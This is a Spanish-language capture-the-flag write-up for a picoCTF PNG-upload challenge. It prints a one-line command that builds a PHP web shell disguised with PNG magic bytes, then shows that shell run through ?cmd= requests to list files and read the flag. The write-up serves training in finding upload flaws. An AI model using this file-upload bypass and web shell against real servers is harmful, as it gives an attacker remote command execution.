## Descripción

I found a web app that can help process images: PNG images only!Try it [here](http://atlas.picoctf.net:52596/)!
## Solución

**Solución 1
```
http://atlas.picoctf.net:52596/uploads/shell.png.php
  |
  |
  v
  �PNG   
**Warning**: Undefined array key "cmd" in **/var/www/html/uploads/shell.png.php** on line **3**  
  
**Fatal error**: Uncaught ValueError: system(): Argument #1 ($command) cannot be empty in /var/www/html/uploads/shell.png.php:3 Stack trace: #0 /var/www/html/uploads/shell.png.php(3): system('') #1 {main} thrown in **/var/www/html/uploads/shell.png.php** on line **3**

http://atlas.picoctf.net:52596/uploads/shell.png.php?cmd=ls
  |
  |
  v
�PNG  shell.png.php

http://atlas.picoctf.net:52596/uploads/shell.png.php?cmd=ls ..
  |
  |
  v
�PNG  MFRDAZLDMUYDG.txt index.php instructions.txt robots.txt uploads

http://atlas.picoctf.net:52596/uploads/shell.png.php?cmd=cat ../MFRDAZLDMUYDG.txt
 |
 |
 v
�PNG  /* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_ab0ece03} */
```

#### NOTAS
- **Crear el archivo especial:** Escribir este comando. Lo que hace es poner los "bytes mágicos" de un PNG al principio para que el servidor se confunda, seguido de una pequeña línea de código PHP:
-echo -e "PNG\r\n\x1a\n<?php system(\$_GET['cmd']); ?>" > exploit.png.php

El error que ves en pantalla (`Fatal error: Uncaught ValueError: system(): Argument #1 ($command) cannot be empty`) es en realidad una **buena noticia**. Significa que el servidor intentó ejecutar tu código PHP, pero falló porque aún no le has pasado el comando que quieres ejecutar.



